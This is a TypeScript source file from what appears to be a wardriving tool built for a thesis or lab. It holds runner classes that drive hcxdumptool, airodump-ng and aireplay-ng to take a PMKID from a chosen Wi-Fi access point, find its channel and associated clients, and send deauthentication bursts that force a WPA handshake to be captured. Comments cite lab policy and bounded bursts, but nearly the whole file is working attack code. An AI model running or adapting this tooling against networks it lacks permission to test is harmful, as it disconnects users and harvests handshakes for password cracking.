import { spawn, ChildProcess } from "child_process";
import { EventEmitter } from "events";
import fs from "fs";

// Attack runners. Each class wraps ONE external process, streams its
// stderr/stdout lines to "log" events, and reports completion through
// "exit". Both are killable at any moment (cancel mid-run) and both
// guarantee their child process group dies with them (detached + group
// kill, same pattern as wifiradar/capture.ts — see the comment there for
// why a plain kill() isn't enough for piped/detached children).

const HCX_PIDFILE = "/tmp/wardrive-hcxdumptool.pid";

function shellSingleQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

export class PmkidRunner extends EventEmitter {
  private proc: ChildProcess | null = null;
  private running = false;

  constructor(
    private iface: string,
    private bssid: string,
    private pcapngPath: string,
  ) {
    super();
  }

  // hcxdumptool 6.x: --filterlist_ap targets exactly this BSSID, --target_ap
  // limits the PMKID roaming-request attack to it, --disable_deauth keeps
  // hcxdumptool from firing its own deauths (deauth bursts are the explicit
  // DeauthRunner's job, so the two methods stay separable for the thesis).
  start(): void {
    if (this.running) return;
    this.running = true;
    const cmd = [
      "sudo", "-n", "hcxdumptool",
      "-i", shellSingleQuote(this.iface),
      "-o", shellSingleQuote(this.pcapngPath),
      "--filterlist_ap=" + this.bssid,
      "--filtermode=2",
      "--target_ap",
      "--disable_deauth",
      "--enable_status=1",
      "--status_timer=10",
      "--err=" + shellSingleQuote("/tmp/wardrive-hcx.err"),
      "--pidfile=" + HCX_PIDFILE,
    ].join(" ");
    this.proc = spawn("bash", ["-c", cmd], { detached: true, stdio: ["ignore", "pipe", "pipe"] });
    this.wireProcess();
  }

  stop(): void {
    this.running = false;
    this.killProc();
  }

  private wireProcess(): void {
    if (!this.proc) return;
    this.proc.stderr?.on("data", (chunk: Buffer) => {
      for (const line of chunk.toString("utf8").split("\n")) {
        const text = line.trim();
        if (text) this.emit("log", text);
      }
    });
    this.proc.on("exit", (code, signal) => {
      const stillRunning = this.running;
      this.running = false;
      this.emit("exit", { code, signal, intentional: !stillRunning });
    });
    this.proc.on("error", (err) => {
      if (!this.running) return;
      this.running = false;
      this.emit("exit", { code: -1, signal: null, intentional: false, error: err?.message });
    });
  }

  private killProc(): void {
    if (!this.proc?.pid) {
      this.proc = null;
      return;
    }
    try {
      process.kill(-this.proc.pid, "SIGTERM");
    } catch {
      try {
        this.proc.kill("SIGTERM");
      } catch {
        // Already gone.
      }
    }
    this.proc = null;
  }
}

// Brief BSSID-filtered airodump scan (hops all channels) to learn the target's
// REAL channel and its associated clients. The WiFi Radar's channel is a
// hopping-capture artifact (it can log the channel it was listening on, not the
// AP's actual channel), so the attack resolves both from the air right before
// locking on — otherwise it would lock the wrong channel and capture nothing.
export async function scanTarget(
  iface: string,
  bssid: string,
  tmpPrefix: string,
  seconds = 9,
): Promise<{ channel: number | null; clients: string[] }> {
  const target = bssid.toUpperCase();
  await new Promise<void>((resolve) => {
    const p = spawn(
      "sudo",
      ["-n", "airodump-ng", "--bssid", target, "-w", tmpPrefix, "--output-format", "csv", "--write-interval", "1", iface],
      { detached: true, stdio: ["ignore", "ignore", "pipe"] },
    );
    let done = false;
    const finish = () => {
      if (done) return;
      done = true;
      try {
        if (p.pid) process.kill(-p.pid, "SIGTERM");
      } catch {
        /* already gone */
      }
      resolve();
    };
    const t = setTimeout(finish, seconds * 1000);
    p.on("exit", () => {
      clearTimeout(t);
      finish();
    });
    p.on("error", () => {
      clearTimeout(t);
      finish();
    });
  });

  let channel: number | null = null;
  const clients: string[] = [];
  try {
    const lines = fs.readFileSync(`${tmpPrefix}-01.csv`, "utf8").split("\n");
    const stationIdx = lines.findIndex((l) => l.startsWith("Station MAC"));
    // AP section (before the station header): find the target's channel.
    for (const line of lines.slice(0, stationIdx < 0 ? lines.length : stationIdx)) {
      const cols = line.split(",").map((c) => c.trim());
      if ((cols[0] || "").toUpperCase() === target) {
        const ch = parseInt(cols[3] || "", 10);
        if (Number.isFinite(ch) && ch > 0) channel = ch;
      }
    }
    // Station section: clients associated to the target.
    if (stationIdx >= 0) {
      for (const line of lines.slice(stationIdx + 1)) {
        const cols = line.split(",").map((c) => c.trim());
        const mac = (cols[0] || "").toUpperCase();
        const assoc = (cols[5] || "").toUpperCase();
        if (/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(mac) && assoc === target) clients.push(mac);
      }
    }
  } catch {
    /* no csv -> nothing learned */
  }
  // Clean the temp scan files (best-effort).
  for (const s of ["-01.csv", "-01.cap", "-01.kismet.csv", "-01.kismet.netxml", "-01.log.csv"]) {
    try {
      fs.unlinkSync(`${tmpPrefix}${s}`);
    } catch {
      /* not there */
    }
  }
  return { channel, clients: [...new Set(clients)] };
}

// Passive capturer: airodump-ng locks the radio to the target BSSID + channel
// and writes a rolling .cap (+ .csv listing associated clients). Runs for the
// whole attack so the deauth-triggered 4-way handshake (and any PMKID) lands in
// the same file, which hcxpcapngtool then validates. This is the simple,
// battle-tested airodump + aireplay workflow.
export class AirodumpCapture extends EventEmitter {
  private proc: ChildProcess | null = null;
  private running = false;

  constructor(
    private iface: string,
    private bssid: string,
    private channel: number,
    private prefix: string, // airodump appends "-01.cap" / "-01.csv"
  ) {
    super();
  }

  capPath(): string {
    return `${this.prefix}-01.cap`;
  }
  csvPath(): string {
    return `${this.prefix}-01.csv`;
  }

  start(): void {
    if (this.running) return;
    this.running = true;
    const args = [
      "sudo", "-n", "airodump-ng",
      "--bssid", this.bssid,
      "-c", String(this.channel),
      "-w", this.prefix,
      "--output-format", "pcap,csv",
      "--write-interval", "1",
      this.iface,
    ];
    // stdout is IGNORED (not piped): airodump-ng continuously redraws a curses
    // table to stdout; if that pipe isn't drained it fills the 64KB buffer and
    // airodump blocks, silently stops capturing and leaves a 0-byte .cap. Only
    // stderr is piped (for error logging).
    this.proc = spawn(args[0], args.slice(1), { detached: true, stdio: ["ignore", "ignore", "pipe"] });
    this.wireProcess();
  }

  // Client MACs associated to the target BSSID, parsed from airodump's live CSV.
  associatedClients(): string[] {
    try {
      const lines = fs.readFileSync(this.csvPath(), "utf8").split("\n");
      const idx = lines.findIndex((l) => l.startsWith("Station MAC"));
      if (idx < 0) return [];
      const target = this.bssid.toUpperCase();
      const macs: string[] = [];
      for (const line of lines.slice(idx + 1)) {
        const cols = line.split(",").map((c) => c.trim());
        const mac = (cols[0] || "").toUpperCase();
        const assoc = (cols[5] || "").toUpperCase(); // station's associated BSSID
        if (/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(mac) && assoc === target) macs.push(mac);
      }
      return [...new Set(macs)];
    } catch {
      return [];
    }
  }

  stop(): void {
    this.running = false;
    this.killProc();
  }

  private wireProcess(): void {
    if (!this.proc) return;
    this.proc.stderr?.on("data", (chunk: Buffer) => {
      for (const line of chunk.toString("utf8").split("\n")) {
        const text = line.trim();
        if (text) this.emit("log", text);
      }
    });
    this.proc.on("exit", (code, signal) => {
      const stillRunning = this.running;
      this.running = false;
      this.emit("exit", { code, signal, intentional: !stillRunning });
    });
    this.proc.on("error", (err) => {
      if (!this.running) return;
      this.running = false;
      this.emit("exit", { code: -1, signal: null, intentional: false, error: err?.message });
    });
  }

  private killProc(): void {
    if (!this.proc?.pid) {
      this.proc = null;
      return;
    }
    try {
      process.kill(-this.proc.pid, "SIGTERM");
    } catch {
      try {
        this.proc.kill("SIGTERM");
      } catch {
        // Already gone.
      }
    }
    this.proc = null;
  }
}

export class DeauthRunner extends EventEmitter {
  private proc: ChildProcess | null = null;
  private running = false;

  constructor(
    private iface: string,
    private bssid: string,
    private clientMac: string | null, // null = broadcast deauth from the AP itself
    private count: number,
    private channel: number,
  ) {
    super();
  }

  // Directed, short deauth bursts only: this module never runs an
  // unbounded broadcast deauth against an AP — lab policy and good
  // practice both. Client MAC comes from the live WIFIRADAR device table.
  start(): void {
    if (this.running) return;
    this.running = true;
    const args = ["sudo", "-n", "aireplay-ng", "--deauth", String(this.count)];
    args.push("-a", this.bssid);
    if (this.clientMac) args.push("-c", this.clientMac);
    args.push("-D"); // don't wait for an ARP/ap-request trigger — push immediately
    args.push(this.iface);
    this.proc = spawn(args[0], args.slice(1), { detached: true, stdio: ["ignore", "pipe", "pipe"] });
    this.wireProcess();
  }

  stop(): void {
    this.running = false;
    this.killProc();
  }

  private wireProcess(): void {
    if (!this.proc) return;
    const onLine = (line: string) => {
      const text = line.trim();
      if (text) this.emit("log", text);
    };
    this.proc.stdout?.on("data", (chunk: Buffer) => onLine(chunk.toString("utf8")));
    this.proc.stderr?.on("data", (chunk: Buffer) => onLine(chunk.toString("utf8")));
    this.proc.on("exit", (code, signal) => {
      const stillRunning = this.running;
      this.running = false;
      this.emit("exit", { code, signal, intentional: !stillRunning });
    });
    this.proc.on("error", (err) => {
      if (!this.running) return;
      this.running = false;
      this.emit("exit", { code: -1, signal: null, intentional: false, error: err?.message });
    });
  }

  private killProc(): void {
    if (!this.proc?.pid) {
      this.proc = null;
      return;
    }
    try {
      process.kill(-this.proc.pid, "SIGTERM");
    } catch {
      try {
        this.proc.kill("SIGTERM");
      } catch {
        // Already gone.
      }
    }
    this.proc = null;
  }
}